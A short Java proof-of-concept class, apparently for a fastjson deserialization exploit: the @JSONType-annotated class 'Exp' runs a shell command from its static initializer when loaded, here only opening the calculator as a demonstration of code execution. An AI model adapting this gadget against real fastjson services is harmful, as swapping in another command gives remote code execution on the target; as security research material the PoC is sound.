import com.alibaba.fastjson.annotation.JSONType;

import java.io.File;
import java.io.IOException;

@JSONType
public class Exp {
    static {
        try {
            Runtime.getRuntime().exec("open -a calculator");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
